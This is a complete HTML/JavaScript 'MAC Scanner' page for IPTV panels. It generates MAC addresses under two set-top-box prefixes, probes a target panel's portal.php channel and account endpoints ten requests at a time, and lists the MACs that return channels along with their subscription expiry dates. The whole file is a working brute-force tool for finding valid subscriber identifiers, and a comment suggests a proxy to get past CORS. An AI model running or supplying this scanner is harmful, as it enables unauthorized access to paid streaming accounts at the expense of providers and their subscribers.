<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MAC Scanner (Frontend‑only)</title><!-- Bootstrap 5 -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />

<style>
    /* ----- DARK‑BLUE GRADIENT BACKGROUND --------------- */
    body {
        background: linear-gradient(135deg, #1e3c72, #2a5298);
        color: #fff;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }
    /* ----- MAIN CARD ----------------------------------- */
    .container {
        background: rgba(255, 255, 255, 0.95);
        border-radius: 15px;
        padding: 30px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        max-width: 800px;
        width: 100%;
        color: #333;
    }
    h2 {
        font-weight: 700;
        color: #1e3c72;
        text-align: center;
        margin-bottom: 20px;
    }
    .info-box {
        background: #f8f9fa;
        border-radius: 10px;
        padding: 15px;
        margin-top: 20px;
        font-size: 1.1rem;
        font-weight: 500;
    }
    #activeHits {
        max-height: 300px;
        overflow-y: auto;
        background: #e9ecef;
        border-radius: 10px;
        padding: 15px;
        margin-top: 20px;
    }
    #activeHits p {
        margin: 5px 0;
        font-size: 0.9rem;
    }
    .copy-all-btn {
        padding: 10px 20px;
        font-size: 1rem;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        margin-top: 10px;
        display: block;
        text-align: center;
    }
    .copy-all-btn:hover {
        background-color: #0056b3;
    }
    /* small tweaks */
    input[type="text"] {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 5px;
    }
    button {
        padding: 10px 20px;
        background-color: #28a745;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        margin: 5px;
    }
    button:hover {
        background-color: #218838;
    }
    .modal-content {
        background: #fff;
        border-radius: 10px;
    }
    .modal-header {
        background: #1e3c72;
        color: #fff;
    }
    .modal-body button {
        width: 100%;
        margin: 5px 0;
    }
    .form-row {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .form-row button {
        flex-shrink: 0;
    }
    @media (max-width: 576px) {
        .container {
            padding: 15px;
        }
        h2 {
            font-size: 1.5rem;
        }
        .form-row {
            flex-direction: column;
            align-items: stretch;
        }
    }
</style>

</head>
<body>
    <div class="container">
        <h2>MAC Scanner (Client‑Side)</h2>
        <form id="scanForm">
            <input type="text" id="panelUrl" placeholder="Enter Panel URL (e.g., http://example.com:8080/)" required />
            <div class="form-row">
                <button type="button" data-bs-toggle="modal" data-bs-target="#comboModal" class="mt-3">Select Combo Type</button>
                <button type="submit" class="mt-3">Start Scan</button>
            </div>
            <input type="hidden" id="comboType" value="" />
            <div class="info-box" id="selectedCombo">Selected Combo: None</div>
        </form><div class="info-box" id="currentMac">Current MAC: -</div>
    <div class="info-box">
        <span id="hitCount">Active Hits: 0</span> |
        <span id="scannedCount">Scanned MACs: 0</span>
    </div>
    <div class="spinner-border text-primary d-none" id="spinner" role="status">
        <span class="visually-hidden">Loading...</span>
    </div>
    <div id="activeHits">No active hits found.</div>
    <button id="copyAllBtn" class="copy-all-btn d-none">Copy All</button>
</div>

<!-- Combo Selection Modal -->
<div class="modal fade" id="comboModal" tabindex="-1" aria-labelledby="comboModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="comboModalLabel">Select Combo Type</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:1A:79')">Sequential 00:1A:79</button>
                <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:2A:01:90')">Sequential 00:2A:01:90</button>
                <button type="button" class="btn btn-primary" onclick="selectCombo('random_mixed')">Random Mixed</button>
            </div>
        </div>
    </div>
</div>

<!-- Bootstrap Bundle -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
    /* -------------------- GLOBAL STATE -------------------- */
    let hitCount = 0;
    let scannedCount = 0;
    let activeHits = [];
    let scanning = false;
    let counterSequential = 0; // for sequential generation
    const concurrency = 10; // parallel fetches

    /* -------------------- UTILITY FUNCS -------------------- */
    const updateText = (id, text) => (document.getElementById(id).innerText = text);
    const show = (el) => el.classList.remove("d-none");
    const hide = (el) => el.classList.add("d-none");

    function selectCombo(combo) {
        document.getElementById("comboType").value = combo;
        let txt = "None";
        if (combo === "sequential_00:1A:79") txt = "Sequential 00:1A:79";
        else if (combo === "sequential_00:2A:01:90") txt = "Sequential 00:2A:01:90";
        else if (combo === "random_mixed") txt = "Random Mixed";
        updateText("selectedCombo", `Selected Combo: ${txt}`);
        // close modal programmatically
        bootstrap.Modal.getInstance(document.getElementById("comboModal")).hide();
    }

    /* -------------- MAC GENERATORS --------------- */
    function generateSequentialMac(prefix) {
        // returns one MAC then auto‑increment counterSequential
        if (prefix === "00:1A:79") {
            const suffix = counterSequential.toString(16).padStart(6, "0").toUpperCase();
            counterSequential++;
            return `${prefix}:${suffix.match(/.{1,2}/g).join(":")}`;
        } else {
            // 00:2A:01:90
            const suffix = counterSequential.toString(16).padStart(4, "0").toUpperCase();
            counterSequential++;
            return `${prefix}:${suffix.match(/.{1,2}/g).join(":")}`;
        }
    }

    function generateRandomMac() {
        const prefixes = ["00:1A:79", "00:2A:01:90"];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const hexChars = "0123456789ABCDEF";
        const randomByte = () =>
            hexChars[Math.floor(Math.random() * 16)] + hexChars[Math.floor(Math.random() * 16)];
        if (prefix === "00:1A:79") {
            return `${prefix}:${randomByte()}:${randomByte()}:${randomByte()}`;
        } else {
            return `${prefix}:${randomByte()}:${randomByte()}`;
        }
    }

    /* ----------- DATE PARSER (client side) ------------- */
    function formatDateWithDiff(raw) {
        if (!raw) return "Unknown";
        if (raw.toLowerCase().startsWith("un")) return "Unlimited (∞)";
        const months = {
            jan: 0,
            feb: 1,
            mar: 2,
            apr: 3,
            may: 4,
            jun: 5,
            jul: 6,
            aug: 7,
            sep: 8,
            oct: 9,
            nov: 10,
            dec: 11,
        };
        try {
            const parts = raw.replace(/,/g, "").split(" ");
            if (parts.length < 3) return raw;
            const day = parseInt(parts[0]);
            const month = months[parts[1].substr(0, 3).toLowerCase()];
            const year = parseInt(parts[2]);
            const date = new Date(year, month, day);
            const now = new Date();
            const diffDays = Math.round((date - now) / (1000 * 60 * 60 * 24));
            return `${day.toString().padStart(2, "0")} ${parts[1].substr(0, 3)}, ${year} (${diffDays} days)`;
        } catch (e) {
            return raw;
        }
    }

    /* --------------- CORE SCAN LOGIC ---------------- */
    async function scanBatch(panelUrl, combo) {
        const tasks = Array.from({ length: concurrency }, async () => {
            if (!scanning) return;
            // generate next MAC
            let mac;
            if (combo === "sequential_00:1A:79" || combo === "sequential_00:2A:01:90") {
                mac = generateSequentialMac(combo === "sequential_00:1A:79" ? "00:1A:79" : "00:2A:01:90");
            } else {
                mac = generateRandomMac();
            }

            updateText("currentMac", `Current MAC: ${mac}`);
            scannedCount++;
            updateText("scannedCount", `Scanned MACs: ${scannedCount}`);

            const urlChannels = `${panelUrl.replace(/\/$/, "")}/portal.php?action=get_all_channels&type=itv&mac=${mac}`;
            const urlAccount = `${panelUrl.replace(/\/$/, "")}/portal.php?type=account_info&action=get_main_info&mac=${mac}&JsHttpRequest=1-xml`;

            try {
                const res = await fetch(urlChannels, { mode: "cors" });
                if (!res.ok) return; // skip
                const jsonCh = await res.json();
                if (!jsonCh || (Array.isArray(jsonCh) && jsonCh.length === 0)) return;

                // Potential hit – fetch account info
                let exp = "Unknown";
                try {
                    const resAcc = await fetch(urlAccount, { mode: "cors" });
                    if (resAcc.ok) {
                        const txt = await resAcc.text();
                        const endMatch = txt.match(/end_date":"([^"]+)/);
                        if (endMatch) exp = formatDateWithDiff(endMatch[1]);
                    }
                } catch (_) {}

                hitCount++;
                updateText("hitCount", `Active Hits: ${hitCount}`);
                const line = `MAC: ${mac} | Exp: ${exp}`;
                activeHits.push(`<p>${line}</p>`);
                document.getElementById("activeHits").innerHTML = activeHits.join("");
                show(document.getElementById("copyAllBtn"));
            } catch (err) {
                // likely CORS – you can use a proxy if needed
            }
        });
        await Promise.all(tasks);
    }

    async function scanLoop(panelUrl, combo) {
        if (scanning) return; // already scanning
        scanning = true;
        show(document.getElementById("spinner"));
        while (scanning) {
            await scanBatch(panelUrl, combo);
            // small delay 200ms between batches
            await new Promise((r) => setTimeout(r, 200));
        }
        hide(document.getElementById("spinner"));
    }

    /* -------------------- FORM HANDLERS ------------------- */
    document.getElementById("scanForm").addEventListener("submit", (e) => {
        e.preventDefault();
        const panelUrl = document.getElementById("panelUrl").value.trim();
        const combo = document.getElementById("comboType").value;
        if (!panelUrl || !combo) {
            alert("Panel URL and Combo Type are required");
            return;
        }
        // reset state
        hitCount = scannedCount = counterSequential = 0;
        activeHits = [];
        updateText("hitCount", "Active Hits: 0");
        updateText("scannedCount", "Scanned MACs: 0");
        document.getElementById("activeHits").innerHTML = "No active hits found.";
        hide(document.getElementById("copyAllBtn"));

        scanLoop(panelUrl, combo);
    });

    document.getElementById("copyAllBtn").addEventListener("click", () => {
        const hitsPlain = activeHits.map((html) => {
            const tmp = document.createElement("div");
            tmp.innerHTML = html;
            return tmp.innerText;
        });
        navigator.clipboard.writeText(hitsPlain.join("\n"));
        alert("All hits copied to clipboard!");
    });

    /* -------- STOP SCAN ON UNLOAD --------------- */
    window.addEventListener("beforeunload", () => (scanning = false));
</script>

</body>
</html>
